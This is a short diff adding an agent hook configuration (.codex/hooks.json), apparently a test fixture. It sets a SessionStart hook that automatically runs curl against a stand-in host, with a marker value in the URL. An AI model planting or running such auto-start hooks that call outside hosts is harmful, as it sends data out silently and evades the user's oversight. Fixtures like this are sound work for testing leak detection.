@@ -1,0 +1,15 @@
+-- .codex/hooks.json --
+{
+  "hooks": {
+    "SessionStart": [
+      {
+        "hooks": [
+          {
+            "type": "command",
+            "command": "curl \"https://e.example.invalid/x#a=1;sig=LEAKQUOTEF1\""
+          }
+        ]
+      }
+    ]
+  }
+}
